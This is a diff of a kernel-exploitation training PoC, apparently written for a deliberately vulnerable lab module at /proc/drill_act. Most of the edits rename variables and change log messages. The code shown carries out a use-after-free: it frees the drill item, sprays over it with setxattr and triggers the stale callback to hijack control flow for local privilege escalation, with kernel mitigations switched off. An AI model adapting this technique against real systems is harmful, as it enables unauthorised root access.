@@ -1,7 +1,6 @@
 /*
  * Funny experiments with Linux kernel exploitation:
- * a basic use-after-free exploit invoking a callback
- * in the freed `drill_item_t` struct.
+ * a basic use-after-free exploit invoking a callback in the freed `drill_item_t` struct.
  *
  * Only basic methods. Just for fun.
  *
@@ -12,6 +11,8 @@
  * 2) Disable mitigations:
  *   - run qemu with "-cpu qemu64,-smep,-smap".
  *   - run the kernel with "pti=off nokaslr".
+ *
+ * This PoC performs control flow hijack and gains LPE.
  */
 
 #define _GNU_SOURCE
@@ -116,7 +117,7 @@ void init_payload(char *p, size_t size)
 	printf("\tcallback 0x%lx\n", (unsigned long)item->callback);
 }
 
-int act(int fd, int code, int n, char *args)
+int act(int act_fd, int code, int n, char *args)
 {
 	char buf[DRILL_ACT_SIZE] = { 0 };
 	size_t len = 0;
@@ -131,7 +132,7 @@ int act(int fd, int code, int n, char *args)
 	assert(len <= DRILL_ACT_SIZE);
 	printf("    going to write \"%s\" (%zu bytes) to drill_act\n", buf, len);
 
-	bytes = write(fd, buf, len);
+	bytes = write(act_fd, buf, len);
 	if (bytes <= 0) {
 		perror("[-] write");
 		return EXIT_FAILURE;
@@ -148,7 +149,7 @@ int main(void)
 {
 	char *spray_data = NULL;
 	int ret = EXIT_FAILURE;
-	int fd = -1;
+	int act_fd = -1;
 	int spray_fd = -1;
 
 	printf("begin as: uid=%d, euid=%d\n", getuid(), geteuid());
@@ -165,8 +166,8 @@ int main(void)
 
 	init_payload(spray_data, MMAP_SZ);
 
-	fd = open("/proc/drill_act", O_WRONLY);
-	if (fd < 0) {
+	act_fd = open("/proc/drill_act", O_WRONLY);
+	if (act_fd < 0) {
 		perror("[-] open drill_act");
 		goto end;
 	}
@@ -181,13 +182,13 @@ int main(void)
 		goto end;
 	}
 
-	printf("[+] spray fd is opened\n");
+	printf("[+] spray_fd is opened\n");
 
-	if (act(fd, DRILL_ACT_ALLOC, 3, NULL) == EXIT_FAILURE)
+	if (act(act_fd, DRILL_ACT_ALLOC, 3, NULL) == EXIT_FAILURE)
 		goto end;
 	printf("[+] DRILL_ACT_ALLOC\n");
 
-	if (act(fd, DRILL_ACT_CALLBACK, 3, NULL) == EXIT_FAILURE)
+	if (act(act_fd, DRILL_ACT_CALLBACK, 3, NULL) == EXIT_FAILURE)
 		goto end;
 	printf("[+] DRILL_ACT_CALLBACK\n");
 
@@ -195,14 +196,14 @@ int main(void)
 	 * Exploit
 	 */
 
-	if (act(fd, DRILL_ACT_FREE, 3, NULL) == EXIT_FAILURE)
+	if (act(act_fd, DRILL_ACT_FREE, 3, NULL) == EXIT_FAILURE)
 		goto end;
 	printf("[+] DRILL_ACT_FREE\n");
 
 	ret = setxattr("./", "foobar", spray_data, PAYLOAD_SZ, 0);
 	printf("setxattr returned %d\n", ret);
 
-	if (act(fd, DRILL_ACT_CALLBACK, 3, NULL) == EXIT_FAILURE)
+	if (act(act_fd, DRILL_ACT_CALLBACK, 3, NULL) == EXIT_FAILURE)
 		goto end;
 	printf("[+] DRILL_ACT_CALLBACK\n");
 
@@ -221,10 +222,11 @@ end:
 			perror("[-] close spray_fd");
 	}
 
-	if (fd >= 0) {
-		ret = close(fd);
+	if (act_fd >= 0) {
+		ret = close(act_fd);
 		if (ret != 0)
-			perror("[-] close fd");
+			perror("[-] close act_fd");
+		printf("  closed the drill_act act_fd\n");
 	}
 
 	return ret;
